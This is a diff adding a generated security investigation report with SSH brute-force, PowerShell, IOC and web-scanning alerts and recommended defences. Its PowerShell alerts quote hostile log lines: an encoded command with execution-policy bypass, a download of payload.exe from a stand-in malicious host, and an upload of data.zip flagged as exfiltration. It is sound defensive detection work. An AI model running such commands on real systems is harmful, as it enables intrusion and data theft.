@@ -1,0 +1,169 @@
+﻿================================================================
+                 SECURITY INVESTIGATION REPORT
+================================================================
+Generated: 2026-05-03 14:04:53
+
+EXECUTIVE SUMMARY
+-----------------
+Total Alerts Detected: 65
+Overall Risk Level: CRITICAL
+
+Detection modules run:
+  [1] SSH Brute Force and Enumeration Detection (auth.log)
+  [2] Suspicious PowerShell Activity (powershell_log.txt)
+  [3] IOC Matching (access.log vs ioc.txt)
+  [4] Web Scanning Detection (access.log)
+
+================================================================
+         SSH BRUTE FORCE AND ENUMERATION (Detection 1)
+================================================================
+Threshold: 5 or more failed SSH login attempts from one IP
+           3 or more distinct usernames tried from one IP
+
+Brute force attempts detected: 46 IP(s)
+Brute force successes: 2 IP(s)
+Username enumeration: 2 IP(s)
+ALERTS:
+  - [BRUTE FORCE] 24.151.103.17 - 157 attempts
+  - [BRUTE FORCE] 34.204.227.175 - 129 attempts
+  - [BRUTE FORCE] 181.26.186.35 - 59 attempts
+  - [BRUTE FORCE] 91.197.232.109 - 58 attempts
+  - [BRUTE FORCE] 122.163.61.218 - 54 attempts
+  - [BRUTE FORCE] 201.178.81.113 - 48 attempts
+  - [BRUTE FORCE] 49.4.143.105 - 40 attempts
+  - [BRUTE FORCE] 181.25.206.27 - 28 attempts
+  - [BRUTE FORCE] 222.186.56.220 - 16 attempts
+  - [BRUTE FORCE] 181.25.201.155 - 16 attempts
+  - [BRUTE FORCE] 103.230.120.26 - 14 attempts
+  - [BRUTE FORCE] 111.40.30.206 - 14 attempts
+  - [BRUTE FORCE] 49.84.87.84 - 14 attempts
+  - [BRUTE FORCE] 125.107.136.165 - 14 attempts
+  - [BRUTE FORCE] 105.101.221.33 - 14 attempts
+  - [BRUTE FORCE] 175.162.187.121 - 14 attempts
+  - [BRUTE FORCE] 179.38.76.250 - 14 attempts
+  - [BRUTE FORCE] 123.96.5.168 - 14 attempts
+  - [BRUTE FORCE] 46.89.129.145 - 14 attempts
+  - [BRUTE FORCE] 183.146.159.20 - 14 attempts
+  - [BRUTE FORCE] 111.40.166.130 - 14 attempts
+  - [BRUTE FORCE] 61.183.117.250 - 14 attempts
+  - [BRUTE FORCE] 122.190.143.18 - 14 attempts
+  - [BRUTE FORCE] 223.244.185.76 - 14 attempts
+  - [BRUTE FORCE] 110.78.174.75 - 14 attempts
+  - [BRUTE FORCE] 183.93.253.159 - 14 attempts
+  - [BRUTE FORCE] 182.243.87.6 - 14 attempts
+  - [BRUTE FORCE] 181.25.189.115 - 14 attempts
+  - [BRUTE FORCE] 114.32.100.101 - 14 attempts
+  - [BRUTE FORCE] 123.153.146.183 - 14 attempts
+  - [BRUTE FORCE] 177.38.145.209 - 14 attempts
+  - [BRUTE FORCE] 183.152.79.79 - 14 attempts
+  - [BRUTE FORCE] 60.187.118.40 - 14 attempts
+  - [BRUTE FORCE] 122.189.198.238 - 14 attempts
+  - [BRUTE FORCE] 178.219.248.139 - 14 attempts
+  - [BRUTE FORCE] 46.30.160.83 - 14 attempts
+  - [BRUTE FORCE] 42.184.142.151 - 14 attempts
+  - [BRUTE FORCE] 61.166.73.66 - 14 attempts
+  - [BRUTE FORCE] 82.64.2.59 - 14 attempts
+  - [BRUTE FORCE] 58.19.144.50 - 14 attempts
+  - [BRUTE FORCE] 119.193.140.176 - 14 attempts
+  - [BRUTE FORCE] 112.251.168.248 - 14 attempts
+  - [BRUTE FORCE] 1.30.211.144 - 14 attempts
+  - [BRUTE FORCE] 93.120.176.237 - 14 attempts
+  - [BRUTE FORCE] 78.106.21.86 - 14 attempts
+  - [BRUTE FORCE] 85.245.107.41 - 13 attempts
+  - [BRUTE FORCE] 14.54.210.101 - 12 attempts
+  - [BRUTE FORCE] 221.194.44.190 - 6 attempts
+  - [BRUTE FORCE SUCCESS] 24.151.103.17 - 157 failed attempts followed by successful login
+  - [BRUTE FORCE SUCCESS] 85.245.107.41 - 13 failed attempts followed by successful login
+  - [ENUMERATION] 91.197.232.109 - 24 distinct usernames tried: 0, 0000, 010101, 1111, 1234, admin, api, dbadmin, default, ftp, ftpuser, git, gpadmin, guest, monitor, operator, osmc, pi, service, support, telecomadmin, test, ubnt, user
+  - [ENUMERATION] 181.26.186.35 - 3 distinct usernames tried: guest, monitor, test
+
+================================================================
+          SUSPICIOUS POWERSHELL ACTIVITY (Detection 2)
+================================================================
+Result: 8 suspicious event(s) detected
+
+Encoded commands: 1
+Execution policy bypass: 1
+Suspicious web requests: 2
+DownloadString usage: 0
+Data exfiltration patterns: 1
+Reconnaissance commands detected: 3
+ALERTS:
+  - [ENCODED COMMAND] 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  - [EXECUTION POLICY BYPASS] 2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+  - [SUSPICIOUS WEB REQUEST] 2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+  - [SUSPICIOUS WEB REQUEST] 2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+  - [DATA EXFILTRATION] Compress-Archive at 2025-02-01 10:05:33 followed by Invoke-WebRequest -Upload at 2025-02-01 10:06:21
+  - [RECONNAISSANCE] 2025-02-01 10:03:01 whoami
+  - [RECONNAISSANCE] 2025-02-01 10:03:10 ipconfig
+  - [RECONNAISSANCE] 2025-02-01 10:03:44 net user
+
+================================================================
+                   IOC MATCHING (Detection 3)
+================================================================
+Result: 5 unique IOC match(es) detected
+
+Malicious IP matches: 2
+Malicious path matches: 3
+ALERTS:
+  - [MALICIOUS IP] 198.51.100.8
+    198.51.100.8 - - [15/Jul/2009:15:50:51 -0700] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 198.51.100.8
+    198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 198.51.100.8
+    198.51.100.8 - - [15/Jul/2009:15:50:53 -0700] "GET /wp-login.php HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 198.51.100.8
+    198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 198.51.100.8
+    198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 203.0.113.5
+    203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 203.0.113.5
+    203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  - [MALICIOUS IP] 203.0.113.5
+    203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /wp-admin
+    198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /wp-admin
+    198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /wp-admin
+    198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /phpmyadmin
+    203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /phpmyadmin
+    203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+  - [MALICIOUS PATH] /admin
+    203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+
+================================================================
+                   WEB SCANNING (Detection 4)
+================================================================
+Threshold: 20 or more HTTP 404/403 errors from a single IP
+Result: 2 scanning IP(s) detected
+ALERTS:
+  - [WEB SCANNING] 10.211.47.159 - 404 Errors: 899 | 403 Errors: 0 | Total Client Errors: 899
+  - [WEB SCANNING] 10.216.113.172 - 404 Errors: 451 | 403 Errors: 0 | Total Client Errors: 451
+
+================================================================
+                         FINAL SUMMARY
+================================================================
+Total Alerts: 65
+Risk Level: CRITICAL
+
+Recommended Actions:
+  - Block IPs with repeated SSH failures using firewall rules.
+  - Enable SSH key-based authentication and disable password login.
+  - URGENT: Confirmed compromise - immediately revoke access for affected IPs.
+  - Investigate all activity from successful login IPs.
+  - Block IPs performing username enumeration at the firewall.
+  - Consider implementing account lockout policies.
+  - Investigate PowerShell execution on the host immediately.
+  - Review PowerShell logging and consider Constrained Language Mode.
+  - Block all IOC IPs and paths at the firewall/WAF level.
+  - Escalate to Tier 2 for deeper forensic investigation.
+  - Rate-limit or block scanning IPs at the web server.
+  - Review WAF rules to detect and block scanner signatures.
+
+================================================================
+                         END OF REPORT
+================================================================
